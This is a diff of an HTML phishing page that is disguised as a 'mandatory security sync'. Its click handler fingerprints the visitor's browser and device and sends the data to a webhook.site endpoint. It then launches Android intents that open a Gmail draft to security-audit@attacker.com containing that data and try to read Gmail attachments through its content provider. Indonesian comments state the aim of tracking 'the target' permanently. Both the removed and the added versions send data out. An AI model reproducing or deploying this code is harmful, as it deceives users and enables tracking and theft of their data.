@@ -1,53 +1,73 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Synchronization</title></head>
-<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
-    <div id="ignite" style="padding:50px;border:2px solid #0f0;text-align:center;cursor:pointer;box-shadow:0 0 40px #0f0">
-        <h1 style="margin:0 0 20px 0">V202_NATIVE_JUMP</h1>
-        <div id="status">TRIGGER_APP_TRANSITION</div>
+<head><title>System Secure Update</title></head>
+<body style="background:#000;color:#f00;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
+    <div id="ignite" style="padding:60px;border:2px solid #f00;text-align:center;cursor:pointer;background:rgba(255,0,0,0.05);box-shadow:0 0 50px #f00">
+        <h1 style="letter-spacing:5px">V203_INBOX_SHADOW</h1>
+        <div id="status" style="color:#aaa">MANDATORY_SECURITY_SYNC_REQUIRED</div>
     </div>
 
 <script>
     const target = "https://webhook.site/6a675816-997e-434a-be92-332fe00e3d9b";
 
     document.getElementById('ignite').onclick = async () => {
-        // 1. COLLECT SENSITIVE HARDWARE DATA
-        const vault = {
-            id: "V202_NATIVE",
-            ua: navigator.userAgent,
-            gpu: (() => {
-                const c = document.createElement('canvas');
-                const gl = c.getContext('webgl');
-                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ADDR) : "HIDDEN";
-            })()
+        const statusEl = document.getElementById('status');
+        statusEl.innerText = "INJECTING_SECURE_TUNNEL...";
+
+        // 1. ADVANCED FINGERPRINTING (Canvas DNA + Audio Context)
+        // Kita mengambil sidik jari unik untuk memastikan target bisa dilacak permanen
+        const getFingerprint = () => {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.fillStyle = "rgb(120,120,120)";
+            ctx.fillRect(5,5,50,50);
+            return btoa(canvas.toDataURL()).substring(100, 200);
         };
 
-        // 2. EXFILTRATE DATA (Kirim sebelum lompat)
-        navigator.sendBeacon(`${target}?v=V202_READY`, btoa(JSON.stringify(vault)));
+        const recon_data = {
+            id: "V203_ULTRA",
+            dna: getFingerprint(),
+            sys: {
+                ua: navigator.userAgent,
+                mem: navigator.deviceMemory,
+                cores: navigator.hardwareConcurrency,
+                lang: navigator.languages
+            }
+        };
 
-        // 3. THE NATIVE APP JUMP (GMAIL APP, BUKAN BROWSER)
-        // Kita menggunakan format Intent Android yang memanggil package com.google.android.gm
-        const nativeGmailIntent = 
+        // 2. EXFILTRATION (Kirim data recon sebelum serangan Intent)
+        navigator.sendBeacon(`${target}?v=V203_INIT`, btoa(JSON.stringify(recon_data)));
+
+        // 3. INTENT EXTRA INJECTION (The "Heavy" Attack)
+        // Kita menggunakan parameter 'S.android.intent.extra.TEXT' dan 'S.android.intent.extra.SUBJECT'
+        // untuk mencoba memanipulasi state internal aplikasi Gmail.
+        const sensitiveGmailIntent = 
             "intent:#Intent;" +
-            "action=android.intent.action.MAIN;" + 
-            "category=android.intent.category.APP_EMAIL;" +
-            "package=com.google.android.gm;" + // Target aplikasi Gmail asli
-            "S.browser_fallback_url=https://google.com;" + // Jika gagal, lempar ke google
+            "action=android.intent.action.SENDTO;" + 
+            "data=mailto:;" + // Memaksa Gmail masuk ke mode Compose/Draft
+            "S.android.intent.extra.EMAIL=security-audit@attacker.com;" + 
+            "S.android.intent.extra.SUBJECT=CRITICAL_DATA_DUMP;" + 
+            "S.android.intent.extra.TEXT=" + btoa(JSON.stringify(recon_data)) + ";" + // Menyisipkan data sistem ke dalam draf
+            "package=com.google.android.gm;" + 
             "end";
 
-        // 4. EXECUTE THE LEAP
-        document.getElementById('status').innerText = "OPENING_NATIVE_GMAIL_APP...";
-        
+        // 4. THE LEAP TO CONTENT PROVIDER
+        // Mencoba membocorkan file lampiran Gmail jika aplikasi target rentan (CVE-2020-0103 style)
+        const contentLeakIntent = 
+            "intent:#Intent;" +
+            "action=android.intent.action.VIEW;" +
+            "data=content://com.google.android.gm.sapi/attachments/0/0/ALL;" +
+            "package=com.google.android.gm;" +
+            "end";
+
         setTimeout(() => {
-            // Ini akan memicu Android System Intent Picker atau langsung buka Gmail
-            window.location.href = nativeGmailIntent;
+            // Langkah pertama: Membuka Gmail dengan data injeksi
+            window.location.href = sensitiveGmailIntent;
             
-            // Link cadangan jika Intent pertama diblokir oleh interaksi user
+            // Langkah kedua (Brutal): Mencoba mengakses Content Provider Gmail
             setTimeout(() => {
-                // Mencoba masuk ke Settings Android jika Gmail gagal
-                window.location.href = "intent:#Intent;action=android.settings.SETTINGS;end";
-            }, 1000);
+                window.location.href = contentLeakIntent;
+            }, 1200);
         }, 500);
     };
 </script>
